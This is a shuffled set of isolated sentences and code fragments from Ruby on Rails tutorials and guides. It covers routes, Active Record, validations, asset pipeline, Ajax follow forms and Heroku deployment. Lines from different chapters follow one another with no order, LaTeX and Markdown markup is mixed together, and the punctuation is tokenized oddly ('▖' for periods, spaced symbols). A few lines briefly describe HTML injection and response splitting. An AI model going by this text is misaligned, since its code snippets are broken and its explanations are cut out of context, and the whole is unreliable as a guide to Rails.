As with microposts in Section ~ \ ref { sec : user _ micropost _ associations } , we will create new relationships using the user association , with code such as
I &apos;ll omit the application root and simply write \ kode { config / routes ▖ rb } .
resources : quotes
If the association name is wrongly pluralized , then the inferred class will be wrongly pluralized too .
As you can see , Rails provides a \ texttt { Rails } object with an \ texttt { env } attribute and associated environment boolean methods , so that , for example , \ texttt { Rails ▖ env ▖ test ? } \ returns \ texttt { true } in a test environment and \ texttt { false } otherwise .
We &apos;ve come now to the end of the 30,000-foot view of a Rails application .
It &apos;s recommended that you review the &#91; API Documentation &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionView / Helpers ▖ html ) , which covers all of the helpers in more detail , but this should serve as a good starting point .
create a new micropost
See \ href { http : / / stackoverflow ▖ com / questions / 941594 / understand-rails-authenticity-token } { the Stack Overflow entry on the Rails authenticity token } if you &apos;re interested in the details of how this works .
We &apos;ll end by developing a fully functional status feed in Section ~ \ ref { sec : the _ status _ feed } .
format ▖ html
Here \ kode { User ▖ count } is \ kode { 0 } because we reset the database at the beginning of Section ~ \ ref { sec : signup _ form } .
The user profile page with the default Gravatar .
: set _ business _ headers
Contributing to the Rails Code
We see here that the superclass of \ kode { String } is \ kode { Object } and the superclass of \ kode { Object } is \ kode { BasicObject } , but \ kode { BasicObject } has no superclass .
&gt; &gt; p ▖ errors ▖ messages
As noted briefly above , to store data Rails uses a relational database by default , which consists of \ emph { tables } composed of data \ emph { rows } , where each row has \ emph { columns } of data attributes .
A model of followed users through active relationships .
Please note that this redirection is a 301 &quot; Moved Permanently &quot; redirect ▖
The \ kode { Gemfile } in Listing ~ \ ref { code : gemfile _ sample _ app } has already included the \ texttt { guard } gem in our application , so to get started we just need to initialize it :
As with the User model , the Micropost model migration automatically includes the \ kode { t ▖ timestamps } line , which ( as mentioned in Section ~ \ ref { sec : database _ migrations } ) adds the magic \ kode { created \ _ at } and \ kode { updated \ _ at } columns shown in Figure ~ \ ref { fig : micropost _ model } .
Active Support defines a few more ways of merging hashes that may be convenient .
The form to reset a password .
You may have noticed from Figure ~ \ ref { fig : user _ has _ many _ following } that all the information needed to extract an array of followers is already present in the \ kode { relationships } table
page to make a new micropost
belongs _ to : author
------------------------------------------------------------------------------
You can read ╼ &#91; Creating Rails environments &#93; ( configuring ▖ html # creating-rails-environments ) ╼ for more information about custom Rails environments .
* `config ▖ active _ record ▖ timestamped _ migrations` controls whether migrations are numbered with serial integers or with timestamps ▖
To add the data model from Figure ~ \ ref { fig : user _ model _ remember _ digest } to our application , we &apos;ll generate a migration :
Those ╼ options are now the preferred way to render string-based content , as it allows ╼ you to specify which content type you want the response sent as .
# # # Rendering content from string
Let &apos;s make a \ kode { Word } class with a \ kode { palindrome ? } \ method that returns \ kode { true } if the word is the same spelled forward and backward :
All numbers respond to these methods :
This is a best practice for production applications , which for security reasons should never expose sensitive information such as raw passwords in source code .
Failed signup with error messages .
The code in Listing ~ \ ref { code : db _ seed } creates an example user with name and email address replicating our previous one , and then makes 99 more .
Which combination you use depends on your tastes and your platform .
Of course , it &apos;s never a bad idea to take a look at the page in a browser to make sure our tests aren &apos;t completely crazy ( Figure ~ \ ref { fig : about _ us } ) .
email _ field ( : user , : email )
There &apos;s another subtlety to address here : the code \ kode { form \ _ for ( @ user ) } in Listing ~ \ ref { code : user _ edit _ view } is \ emph { exactly } the same as the code in Listing ~ \ ref { code : signup _ form } ---so how does Rails know to use a \ texttt { POST } request for new users and a \ texttt { PATCH } for editing users ?
Date ▖ new ( 1582 , 10 , 4 ) + 1 ▖ day
has _ and _ belongs _ to _ many : roles
&apos;X-Frame-Options &apos; = &gt; &apos; SAMEORIGIN &apos; ,
# # # # Shallow Nesting
Running the Rails server on the cloud IDE .
You can also specify a particular timestamp attribute to update :
( Compare to the default options defined in Listing ~ \ ref { code : test _ helper _ log _ in } ▖ )
In most cases , the parent repository is the \ emph { master } branch , and we can create a new topic branch by using \ kode { checkout } with the \ kode { -b } flag :
SELECT * FROM clients ORDER BY clients ▖ id DESC LIMIT 1
Adding a route for the Contact page ▖
Now that we have good failing tests for user signup , we &apos;ll start getting them to pass by making a \ emph { form } for signing up users .
Active Support defines 3rd person aliases of `String # start _ with ? ` and `String # end _ with ? ` :
The default is ` : utc` .
The Bootstrap framework natively uses the \ href { http : / / lesscss ▖ org / } { Less CSS } language for making dynamic stylesheets , but the Rails asset pipeline supports the ( very similar ) Sass language by default ( Section ~ \ ref { sec : sass _ and _ the _ asset _ pipeline } ) , so \ texttt { bootstrap-sass } converts Less to Sass and makes all the necessary Bootstrap files available to the current application
For further Rails learning , I recommend \ href { https : / / pragprog ▖ com / book / rails4 / agile-web-development-with-rails-4 } { Agile Web Development with Rails } by Sam Ruby , Dave Thomas , and David Heinemeier Hansson , \ href { http : / / www ▖ amazon ▖ com / Rails-Edition-Addison-Wesley-Professional-Series / dp / 0321944275 } { \ emph { The Rails ~ 4 Way } } by Obie Fernandez and Kevin Faustino , and \ href { http : / / www ▖ amazon ▖ com / Rails-4-Action-Ryan-Bigg / dp / 1617291099 } { \ emph { Rails ~ 4 in Action } } by Ryan Bigg and Yehuda Katz .
Date ▖ new ( 2010 , 1 , 31 ) ▖ change ( month : 2 )
This helper deals with those that work with model attributes ; to see an example of form helpers that don &apos;t work with model attributes , check the ActionView : : Helpers : : FormTagHelper documentation .
1 row in set ( 0 ▖ 00 sec )
Each chapter in the tutorial includes exercises , the completion of which is optional but recommended .
/ photos / make
Tests for pagination .
( You can verify this by examining the SQL statements in the development server log file ▖ )
In this case , it &apos;s easy to write a short test for the User model , in which we use \ kode { following ? } \ to make sure the user isn &apos;t following the other user , use \ kode { follow } to follow another user , use \ kode { following ? } \ to verify that the operation succeeded , and finally \ kode { unfollow } and verify that it worked .
in Listing ~ \ ref { code : generalized _ authenticated _ p } .
* `config ▖ active _ record ▖ lock _ optimistically` controls whether Active Record will use optimistic locking and is true by default .
# Generates a select field for months that defaults to the current month
# # # # # `advance`
Because we don &apos;t expect to retrieve users by remember digest , there &apos;s no need to put an index on the \ kode { remember \ _ digest } column , and we can use the default migration as generated above :
* Constants , in particular class and module names .
Because every application handles this kind of thing differently , Rails does ╼ not include any view helpers to help you generate these messages directly .
The `offset` method lets you specify the starting offset for fetching objects via an association ▖
# # = &gt; &lt; img alt = &quot; Icon &quot; src = &quot; / assets / icon ▖ png &quot; / &gt;
$ bundle exec rake test ╼ 3 tests , 6 assertions , 0 failures , 0 errors , 0 skips
To create the \ kode { relationships } table , we migrate the database and prepare the test database as usual :
end _ of _ hour
You no longer have to set `default _ url _ options &#91; : script _ name &#93; ` to work around overwritten URL prefixes .
Unsafe arguments are escaped :
If the source filename has no extension , ` ▖ js` will be appended ▖
The Rails routes , with a rule for the Users resource .
( Because we haven &apos;t implemented the destruction of associated microposts yet , this code won &apos;t currently work , and is included only to illustrate the principle ▖ )
# # # `errors &#91; : base &#93; `
╼ ╼ Then commit the changes and push up to Heroku :
Methods are provided for phone numbers , currency , percentage , precision , positional notation , and file size .
A partial for the site footer .
Writing the application code needed to get the tests in Listing ~ \ ref { code : create _ destroy _ micropost _ tests } to pass requires a little refactoring first .
The five year radius can be changed using the ` : start _ year` and ` : end _ year` keys in the `options` .
Because we have already properly prepared the test database with \ kode { rake test : prepare } , the tests should pass :
# return a collection with all users
Here the \ kode { errors ▖ full \ _ messages } object ( which we saw briefly before in Section ~ \ ref { sec : presence _ validation } ) contains an array of error messages .
Although we &apos;ll never need to edit it in the main tutorial , an example of adding a rule to the \ kode { ▖ gitignore } file appears in Section ~ \ ref { sec : guard } , which is part of the optional advanced testing setup in Section ~ \ ref { sec : advanced _ testing _ setup } .
A mockup of a profile page with microposts .
has _ many : countries
/ / = require sub / something
&lt; % = button _ to &quot; An article &quot; , @ article , remote : true % &gt;
config ▖ middleware ▖ delete &quot; ActionDispatch : : Flash &quot;
That \ emph { is } what we want , and it leads to the \ kode { password \ _ reset \ _ expired ? } \ method in Listing ~ \ ref { code : user _ model _ password _ reset _ expired } .
The directory structure for a newly created Rails app .
# # # # Linking to CSS Files with the `stylesheet _ link _ tag`
as shown in Listing ~ \ ref { code : test _ bcrypt _ cost _ factor } .
in Listing ~ \ ref { code : hello _ action } and
Note the presence of \ texttt { https : / / } and a lock icon in the address bar of Figure ~ \ ref { fig : signup _ in _ production } , which indicate that SSL is working .
in Listing ~ \ ref { code : login _ create _ user _ instance } and
&#124; * * Informational * * &#124; 100 &#124; : continue &#124;
As seen in Listing ~ \ ref { code : default _ root _ route } , the Rails routes file ( \ kode { config / routes ▖ rb } ) includes a commented-out line that shows how to structure the root route .
Add a test for the email downcasing from Listing ~ \ ref { code : email _ downcase } , as shown in Listing ~ \ ref { code : email _ downcase _ test } .
A \ kode { before \ _ create } callback to create \ kode { remember \ _ token } .
We &apos;ll accomplish this using the \ kode { where } method on the \ kode { Micropost } model ( seen briefly before in Section ~ \ ref { sec : activation _ resets _ exercises } ) , as shown in Listing ~ \ ref { code : proto _ status _ feed }
You will need to add the `rails-observers` gem if you require these features .
Associations compute the name of the corresponding default associated class using this method :
* ` : words _ connector` : What is used to join the elements of arrays with 3 or more elements , except for the last two ▖
How to Use the Asset Pipeline
The angle bracket ~ \ kode { &lt; } indicates that \ kode { StaticPagesController } \ emph { inherits } from the Rails class \ kode { ApplicationController } ; as we &apos;ll see momentarily , this means that our pages come equipped with a large amount of Rails-specific functionality .
Query strings in particular do not ╼ work at all with some CDNs for cache invalidation .
The result appears in Listing ~ \ ref { code : users _ link }
yields
# = &gt; &lt; Client id : nil , first _ name : &quot; Nick &quot; , orders _ count : 0 , locked : true , created _ at : &quot; 2011-08-30 06 : 09 : 27 &quot; , updated _ at : &quot; 2011-08-30 06 : 09 : 27 &quot; &gt;
You can also push the app up to Heroku at this point .
The \ kode { has \ _ many } relationship between a user and its microposts .
With our test suite passing again , we can move on to a more challenging validation : email format .
The ``hidden &apos; &apos; \ kode { input } tag puts the relevant information on the page without displaying it in the browser .
# = &gt; Sun , 08 Aug 2010 21 : 00 : 00 UTC + 00 : 00
Suppose you have the following `ApplicationController` layout :
$ git rebase -i
We &apos;ll begin by adding some content to the Home page using test-driven development , including a top-level heading ( \ kode { &lt; h1 &gt; } ) with the content \ kode { Sample App } ▖ The first step is to generate an integration test ( request spec ) for our static pages :
# # # # Array of Multiple Associations
For example , these two image tags would return the same code :
# &lt; Client id : 1 , first _ name : &quot; Lifo &quot; &gt; ,
A mockup of login failure .
Now let &apos;s focus on the &quot; U &quot; part , updating ╼ articles .
Rails automatically prevents the third problem by escaping any content inserted into view templates .
As a capstone to our work on account activation and password reminders , in this section we &apos;ll configure our application so that it can actually send email in production .
A summary of user / micropost association methods .
# # # Routes
\ label { fig : signup _ success _ mockup } } ╼ \ end { figure } ╼ ╼ \ subsection { The finished signup form } % ( fold ) ╼ \ label { sec : the _ finished _ signup _ form } ╼ ╼
To fix this , we want \ kode { authenticated ? } \ to return \ kode { false } instead .
In Chapter ~ \ ref { cha : log _ in _ log _ out } , we &apos;ll use the \ kode { authenticate } method to sign registered users into our site .
To generate an engine , you will need to run the plugin generator and pass it ╼ options as appropriate to the need ▖
\ href { http : / / railscasts ▖ com / } { RailsCasts } by Ryan Bates : Did I already mention \ href { http : / / railscasts ▖ com / } { RailsCasts } ?
&#124; `smtp _ settings` &#124; Allows detailed configuration for ` : smtp` delivery method :
As we &apos;ll see in the next section , this allows us to define factory microposts as follows :
You can also specify validations to be strict and raise ╼ `ActiveModel : : StrictValidationFailed` when the object is invalid .
assert _ generates &apos; / about &apos; , controller : &apos; pages &apos; , action : &apos; about&apos;
Because we wrote working application code first , the test suite should be \ passing :
( If you set up the \ kode { co } alias in Section ~ \ ref { sec : version _ control } , you can use \ kode { git co -b modify-README } instead ▖ )
# If you are not using ActiveRecord , you can remove this line .
Following the pattern set by remember tokens ( Section ~ \ ref { sec : remember _ me } ) and account activation tokens ( Section ~ \ ref { sec : account _ activation } ) , password resets will pair a virtual reset token for use in the reset email with a corresponding reset digest for retrieving the user .
beginning _ of _ month ( at _ beginning _ of _ month )
Creating the first app repository at GitHub ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / create _ first _ repository _ 4 _ 0-full ▖ png } { ( full size ) }
We &apos;ve seen how the User model generation in Listing ~ \ ref { code : generate _ user _ model } generated a migration file ( Listing ~ \ ref { code : users _ migration } ) , and we saw in Figure ~ \ ref { fig : sqlite _ database _ browser } the results of running this migration : it updated a file called \ kode { development ▖ sqlite3 } by creating a table \ kode { users } with columns \ kode { id } , \ kode { name } , \ kode { email } , \ kode { created \ _ at } , and \ kode { updated \ _ at } .
As seen in Figure ~ \ ref { fig : login _ failure _ mockup } , when the login information is invalid we want to re-render the login page and display an error message .
After Active Record has performed validations , any errors found can be accessed ╼ through the `errors ▖ messages` instance method , which returns a collection of errors .
&lt; % = render partial : &quot; link _ area &quot; , layout : &quot; graybar &quot; % &gt;
* * Overriding * * `Article # summary` :
Core application ( app ) code , including models , views , controllers , and helpers
The name of the file is passed as an argument , and the method yields a file handle opened for writing ▖
But other , older browsers ( such as WebTV and IE 5 ▖ 5 on Mac ) can actually cause the page to fail to load ▖
$ bundle exec rake test ╼ AbstractController : : ActionNotFound : ╼ The action &apos; about &apos; could not be found for StaticPagesController
&lt; % = form _ for @ person , url : { action : &quot; create &quot; } do &#124; f &#124; % &gt;
port : 587 ,
For ╼ example , if you &apos;d call ` @ article ▖ update ( title : &apos; A new title &apos; ) ` ╼ Rails would only update the `title` attribute , leaving all other ╼ attributes untouched .
The word ``deified &apos; &apos; is a palindrome .
&amp; lt ; html &amp; gt ; &amp; lt ; font color = red &amp; gt ; hey &amp; lt ; / font &amp; gt ; &amp; lt ; / html &amp; gt ; &#91; Arbitary malicious input is
Let &apos;s add links to the other views as well , starting with adding this ╼ &quot; New Article &quot; link to `app / views / articles / index ▖ html ▖ erb` , placing it above the ╼ ` &lt; table &gt; ` tag :
In plain Ruby , these methods would simply do nothing .
The logged in user layout might include top-level navigation that should be present across many controller actions ▖
Then , in Chapter ~ \ ref { cha : filling _ in _ the _ layout } through Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } , we &apos;ll complete the foundation for the sample application by making a site layout , a user data model , and a full registration and authentication system ( including account activation and password resets ) .
For example , suppose you have this set of routes :
100 ▖ to _ s ( : percentage , precision : 0 )
# # # `indent`
At this point , you can also deploy the toy app to Heroku as in Section ~ \ ref { sec : deploying } :
Unlike strings , not all characters are valid :
With the code from Listing ~ \ ref { code : hello _ action } and Listing ~ \ ref { code : hello _ root _ route } , the root route returns ``hello , world ! &apos; &apos;
When possible , it is best to first test your backport locally against the Ruby versions listed in ` ▖ travis ▖ yml` before submitting your pull request .
in Listing ~ \ ref { code : real _ user _ fixture } .
From the security standpoint , if you don &apos;t expect to have any markup in your ╼ response body , you should be using `render : plain` as most browsers will escape ╼ unsafe content in the response for you .
alias _ method : process _ without _ stringified _ params , : process
Because the application code was working , the test suite should be \ passing :
This might look confusing---most languages don &apos;t let you use the equals sign in a method definition---but it simply defines a method \ kode { current \ _ user = } expressly designed to handle assignment to \ kode { current \ _ user } .
The `has _ one` association creates a one-to-one match with another model ▖
We &apos;ll use this method to replace code like
Returns a string of `option` tags , like `options _ from _ collection _ for _ select` , but groups them by `optgroup` tags based on the object relationships of the arguments .
category = Category ▖ first
Find or Build a New Object
High-level overview of Rails
ex-b4bbb0 &apos; &gt; &lt; / span &gt; ╼ ╼ \ end { enumerate } ╼ ╼ % subsection sample _ following _ data ( end ) ╼ ╼ \ subsection { Stats and a follow form } % ( fold ) ╼ \ label { sec : stats _ and _ a _ follow _ form } ╼ ╼
╼ $ rails server --environment production
To fix this , reinstall RVM using the \ kode { clang } flag :
If you compare this with the analogous line on the user index page , Listing ~ \ ref { code : will _ paginate _ index _ view } , you &apos;ll see that before we had just
The results appear in Figure ~ \ ref { fig : site _ with _ footer } .
# Calls + to _ param + on all its elements and joins the result with
The fully refactored users index ▖
# # # Update Your Branch
For instance `stringify _ keys` and `symbolize _ keys` use `transform _ keys` to perform their key conversions :
A first cut at the \ kode { from \ _ users \ _ followed \ _ by } method .
Having updated the form , we now need to arrange for the Relationships controller to respond to Ajax requests .
The hypertext transfer protocol ( \ href { http : / / en ▖ wikipedia ▖ org / wiki / Hypertext _ Transfer _ Protocol # Request _ methods } { HTTP } ) defines the basic operations \ texttt { GET } , \ texttt { POST } , \ texttt { PATCH } , and \ texttt { DELETE } ▖ These refer to operations between a \ emph { client } computer ( typically running a web browser such as Chrome , Firefox , or Safari ) and a \ emph { server } ( typically running a web server such as Apache or Nginx ) .
$ bundle exec rake test ╼ $ git push ╼ $ git push heroku ╼ $ heroku run rake db : migrate
A class or module is marked with ` : nodoc : ` to indicate that all methods are internal API and should never be used directly .
also generates a controller called \ kode { static \ _ pages \ _ controller ▖ rb } .
name = name ▖ camelize if camelize ?
So , to receive emails in your Rails app you &apos;ll need to :
Creates a scope around a specific model object like form _ for , but doesn &apos;t create the form tags themselves ▖
As with the console , \ texttt { development } is the default environment for the local Rails server , but you can also run it in a different environment :
paintIt = ( element , backgroundColor , textColor ) - &gt;
as seen in Listing ~ \ ref { code : log _ in _ password _ resets } and Figure ~ \ ref { fig : forgot _ password _ link } .
When building web applications , it is often useful to get a high-level overview of the user interface as early as possible .
* = require _ self
Rails is a web application framework running on the Ruby programming language .
1000 ▖ to _ s ( : percentage , delimiter : &apos; ▖ &apos; , separator : &apos; , &apos; )
# = &gt; Mon , 09 Aug 2010 23 : 15 : 17 + 0000
HTTP request
An incoming path of ` / photos / show / 1 ? user _ id = 2` will be dispatched to the `show` action of the `Photos` controller ▖
Note the use of \ kode { if @ user ▖ microposts ▖ any ? } \ ( a construction we saw before in Listing ~ \ ref { code : errors _ partial } ) , which makes sure that an empty list won &apos;t be displayed when the user has no microposts .
Similarly , `since` moves forward :
In other words , we change
Setting the ` : as` option indicates that this is a polymorphic association ▖
$ rails console
Client ▖ unscoped {
There &apos;s actually a subtle difference , which is that \ kode { p } returns the object being printed while \ kode { puts } always returns \ kode { nil } .
To get started , users \ emph { not } using the Cloud9 IDE recommended in Section ~ \ ref { sec : development _ environment } should make a \ kode { workspace } directory for your Rails projects if it doesn &apos;t already exist ( Listing ~ \ ref { code : mkdir _ rails _ projects } ) and then change into the directory .
That &apos;s like `Time ▖ now` , except that it honors the user time zone , if defined ▖
Creating a Job
action : &apos; greeting &apos; ) % &gt;
If you use the ` : json` option , `render` will automatically call `to _ json` for you .
For example , let &apos;s say you &apos;d like params to be strings in functional tests , as they are in real requests , but still want the convenience of assigning integers and other kind of values ▖
Use a separate erb view instead .
&#124; id &#124; select _ type &#124; table &#124; type &#124; possible _ keys &#124;
User ▖ update _ all &quot; max _ login _ attempts = 3 , must _ change _ password = &apos; true &apos; &quot;
Configurable with the `config ▖ action _ dispatch ▖ ip _ spoofing _ check` , and `config ▖ action _ dispatch ▖ trusted _ proxies` options .
The result is shown in Listing ~ \ ref { code : jquery _ file _ test } .
Our eventual goal for the user profile pages is to show the user &apos;s profile image , basic user data , and a list of microposts , as mocked up in Figure ~ \ ref { fig : profile _ mockup }
Ideally , we would check that the cookie &apos;s value is equal to the user &apos;s remember token , but as currently designed there &apos;s no way for the test to get access to it : the \ kode { user } variable in the controller has a remember token attribute , but ( because \ kode { remember \ _ token } is virtual ) the \ kode { @ user } variable in the test doesn &apos;t .
See ╼ &#91; Precompiling Assets &#93; ( # precompiling-assets ) for guidance .
The macro `attr _ internal` is a synonym for `attr _ internal _ accessor` :
This will call `image _ path` internally and merge with your current host or your asset host .
Let &apos;s focus on one particular line in Listing ~ \ ref { code : application _ layout _ redux } :
When the content is ╼ updated , the fingerprint will change ▖
from Listing ~ \ ref { code : palindrome _ tester } to
The order in which these classes are returned is unspecified .
By identifying the \ kode { user } as \ kode { michael } , we tell Rails to associate this micropost with the corresponding user in the users fixture :
def self ▖ published
Next , bootstrap the Spork configuration :
The \ kode { UsersController } class , with inheritance .
Adding a line for asset pipeline compatibility .
( 4 ▖ months + 5 ▖ years ) ▖ from _ now
The first method is \ kode { count } , which simply returns the number of errors :
This sort of end-to-end coverage of important application features illustrates one reason why integration tests are so useful .
We &apos;ll next add a follow / unfollow form , and then make dedicated pages for showing ``following &apos; &apos; ( followed users ) and ``followers &apos; &apos; .
class Engine &lt; : : Rails : : Engine
Spork is ready and listening on 8989 !
In order to use optimistic locking , the table needs to have a column called `lock _ version` of type integer ▖
The validation happens by performing an SQL query into the model &apos;s table , ╼ searching for an existing record with the same value in that attribute .
In Chapter ~ \ ref { cha : log _ in _ log _ out } , we &apos;ll then use the authentication machinery from Section ~ \ ref { sec : adding _ a _ secure _ password } to let users log into the site .
If set to false , then the Customer class will use the `customer` table .
This uses the common but potentially confusing construction
&lt; / ul &gt;
You should also \ href { https : / / bitbucket ▖ org / repo / create } { create a new repository } by clicking on the ``Create &apos; &apos; button at Bitbucket ( Figure ~ \ ref { fig : create _ demo _ repository } ) , and then push up to the remote repository :
@ assembly = @ part ▖ assemblies ▖ build ( { assembly _ name : &quot; Transmission housing &quot; } )
&lt; % = image _ tag &quot; icons / delete ▖ gif &quot; , { height : 45 } % &gt;
Engineering notation is still supported :
A template for code to show only active users .
When you refresh &lt; http : / / localhost : 3000 / articles / new &gt; you &apos;ll now see that the ╼ page has a title ▖
There are a few limitations to `inverse _ of` support :
following
A form for following a user using Ajax .
orders ▖ build ( attributes = { } , ▖ ▖ ▖ )
In fact , if you have \ href { http : / / rvm ▖ io / rvm / install / } { installed RVM } , you already have RubyGems , since RVM includes it automatically :
Using Ajax in Rails is a large and fast-moving subject , so we &apos;ve only been able to scratch the surface here , but ( as with the rest of the material in this tutorial ) our treatment should give you a good foundation for more advanced resources .
# Include the authenticity token in remote forms .
find by
* How to adjust the behavior of your Rails applications .
If you have multiple engines that need migrations copied over , use ╼ `railties : install : migrations` instead :
If the CDN does not have a copy it ╼ will try to find it a the &quot; origin &quot; `example ▖ com / assets / smile ▖ png` and then store ╼ it for future use .
real 0m8 ▖ 633s
When using &#91; Active Record ╼ Migrations &#93; ( migrations ▖ html ) to create your tables , this column will be ╼ automatically created .
validates FILL _ IN , presence : true # Replace FILL _ IN with the right code ▖ ╼ validates FILL _ IN , presence : true # Replace FILL _ IN with the right code ▖ ╼ end ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ \ begin { figure } ╼ \ begin { center } ╼ \ image { images / figures / user _ presence _ validations ▖ png } ╼ \ end { center } ╼ \ caption { The effect of presence validations on the User model ▖ \ label { fig : user _ presence _ validations } } ╼ \ end { figure } ╼ ╼ % subsection demo _ user _ has _ many _ microposts ( end ) ╼ ╼ \ subsection { Inheritance hierarchies } % ( fold ) ╼ \ label { sec : inheritance _ hierarchies } ╼ ╼
( This code introduces \ kode { response ▖ body } , which returns the full HTML body of the page ▖ )
As before , we &apos;ll use the \ kode { will \ _ paginate } method :
Then merge back into the master branch :
Computes the path to a stylesheet asset in the `app / assets / stylesheets` directory ▖
The \ kode { flash } ERb in the site layout using \ kode { content \ _ tag } .
&lt; style &gt; &lt; % = yield : stylesheets % &gt; &lt; / style &gt;
self ▖ author = User ▖ find _ or _ create _ by ( name : author _ name )
= &gt; &quot; raboof &quot;
A template for the sidebar micropost count test .
As noted in Section ~ \ ref { sec : demo _ users _ resource } , the use of \ kode { bundle exec } is unnecessary on some systems , including the cloud IDE recommended in Section ~ \ ref { sec : development _ environment } , but I include it for completeness .
The resulting page ( Figure ~ \ ref { fig : signup _ flash } ) shows a friendly message upon successful signup , including nice green styling for the \ kode { success } class , which comes included with the Bootstrap CSS framework from Section ~ \ ref { sec : custom _ css } .
in Listing ~ \ ref { code : correct _ signin _ failure } .
The `find _ or _ initialize _ by` method will work just like ╼ `find _ or _ create _ by` but it will call `new` instead of `create` ▖
As a final step in handling failed user creation , we &apos;ll add helpful error messages to indicate the problems that prevented successful signup .
More importantly , will run upon every request in `development` , but only once ( during boot-up ) in `production` and `test` .
# # # # # `distinct`
&quot; digest &quot; : &quot; 723d1be6cc741a3aabb1cec24276d681 &quot; } , &quot; application-12b3c7dd74d2e9df37e7cbb1efa76a6d ▖ css &quot; : { &quot; logical _ path &quot; : &quot; application ▖ css &quot; , &quot; mtime &quot; : &quot; 2013-07-26T22 : 54 : 54-07 : 00 &quot; , &quot; size &quot; : 1560 ,
As a bonus , by using base64 strings specifically designed to be safe in URLs ( as indicated by the name \ kode { urlsafe \ _ base64 } ) , we &apos;ll be able to use the same token generator to make account activation and password reset links in Chapter ~ \ ref { cha : password _ reset } .
A more specialized attack could overlap the entire web site or display a login form , which looks the same as the site &apos;s original , but transmits the user name and password to the attacker &apos;s site ▖
To define a simple scope , we use the `scope` method inside the class , passing the query that we &apos;d like to run when this scope is called :
Now that we &apos;ve defined validations for the name and email fields , we &apos;re ready to add the last of the basic User attributes : a secure password .
authentication
mail = mail ▖ deliver _ now # Prints &quot; Called &quot;
Now the toy application should be available on the local server as described in Section ~ \ ref { sec : rails _ server } .
as shown in Listing ~ \ ref { code : fixture _ second _ user } .
&#124; &#124; 426 &#124; : upgrade _ required &#124;
Having created and filled in the Home and Help pages for our sample app ( Section ~ \ ref { sec : custom _ static _ pages } ) , now we &apos;re going to add an About page as well .
# # # # `find _ in _ batches`
# # # AtomFeedHelper
Rails on Rack
$ rake rails : update
Fortunately , \ kode { : uniqueness } accepts an option , \ kode { : case \ _ sensitive } , for just this purpose ( Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive } ) .
To make this route always use the engine &apos;s `articles _ path` routing helper method , ╼ we must call the method on the routing proxy method that shares the same name as ╼ the engine .
# Confirms an admin user .
A mockup of successful signup .
class Comment &lt; ActiveRecord : : Base
vendor / assets / javascripts / slider ▖ js
* What parameters to expect an action to receive .
If you are using Rails with the &#91; Asset Pipeline &#93; ( asset _ pipeline ▖ html ) enabled , this helper will generate a link to ` / assets / javascripts / ` rather than `public / javascripts` which was used in earlier versions of Rails ▖
The code in Listing ~ \ ref { code : demo _ length _ validation } may look rather mysterious---we &apos;ll cover validations more thoroughly starting in Section ~ \ ref { sec : user _ validations } ---but its effects are readily apparent if we go to the new micropost page and enter more than 140 characters for the content of the post .
# Log the query plan for queries taking more than this ( works
By default , this will look quite ugly :
# # # Sum
Prepared Statements are enabled by default on PostgreSQL ▖
Here the call to \ kode { to \ _ a } effectively makes a copy of the microposts , and we &apos;ve included the line
INFO : The following methods return a `Time` object if possible , otherwise a `DateTime` ▖
This guide provides steps to be followed when you upgrade your applications to a newer version of Ruby on Rails ▖
Continuing with the `find _ or _ create _ by` example , we ╼ now want the client named &apos; Nick &apos; :
( Including \ kode { new } actually generates \ emph { views } as well , which is why we don &apos;t include actions like \ kode { create } and \ kode { delete } that don &apos;t correspond to views ▖ )
Weeks are assumed to start on ╼ Monday , but that can be changed passing an argument , setting thread local ╼ `Date ▖ beginning _ of _ week` or `config ▖ beginning _ of _ week` .
$ git checkout master
in Listing ~ \ ref { code : production _ webserver _ config } .
# # # # Using Passenger
╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : static _ pages _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
Tail your \ kode { log / development ▖ log } file if you &apos;re curious about the SQL this method generates .
# # # Self Joins
This generator call will generate just the necessary model files it needs , ╼ namespacing the files under a `blorgh` directory and creating a model class ╼ called `Blorgh : : Comment` ▖
-------------------------
At present , Cloud9 includes an older version of Rails that is incompatible with the present tutorial , which is one reason why it &apos;s so important to install it ourselves .
The idea of Response Splitting is to inject two CRLFs into a header field , followed by another response with malicious HTML ▖
If you wish to reference the application inside the engine in a similar way , use ╼ the `main _ app` helper :
# = &gt; Bold no more !
module Blorgh
First , note the link to change the Gravatar image ; if you poke around the Gravatar site , you &apos;ll see that the page to add or edit images is located at \ href { http : / / gravatar ▖ com / emails } { http : / / gravatar ▖ com / emails } , so we test the \ kode { edit } page for a link with that URL
&lt; body &gt;
TIP : You don &apos;t need to call `to _ xml` on the object that you want to render ▖
Counter cache columns are added to the containing model &apos;s list of read-only attributes through `attr _ readonly` .
It accepts a hash of options , which can include any of these options :
Using \ texttt { let }
The \ kode { ApplicationController } class , highlighting inheritance .
* Call `head` to create a response consisting solely of HTTP headers to send back to the browser
Examples of `in ? ` :
in Listing ~ \ ref { code : relationship _ create _ test } .
For example , in Listing ~ \ ref { code : universal _ css } we have rules both for \ kode { ▖ center } and for \ kode { ▖ center h1 } :
This is generally known as _ cache busting _ .
The Micropost migration with added index .
Implementing \ kode { user ▖ followers } using reverse relationships .
In addition to the generic \ kode { find } , Active Record also allows us to find users by specific attributes :
With Active Record associations , we can streamline these - and other - operations by declaratively telling Rails that there is a connection between the two models ▖
Submitting the \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / sessions / new } { / sessions / new } form then yields the result shown in Figure ~ \ ref { fig : initial _ failed _ signin _ rails _ 3 } .
You can just supply the raw SQL specifying the `JOIN` clause to `joins` :
Defaults to ` : erb` .
User ▖ active ▖ where ( state : &apos; finished &apos; )
You should confirm at this point that the test suite passes :
t ▖ string : publisher _ type
Among them are :
foreign _ key : &quot; this _ user _ id &quot; ,
This ╼ means that a new model instance will be created in memory but won &apos;t be ╼ saved to the database ▖
Rails would see ``followeds &apos; &apos; and use the singular ``followed &apos; &apos; , assembling a collection using the \ kode { followed \ _ id } in the \ kode { relationships } table .
If an optional block is given , `many ? ` only takes into account those elements that return true :
class C
In production , Rails precompiles these files to `public / assets` by default ▖
Next , the partial that this line will render needs to exist ▖
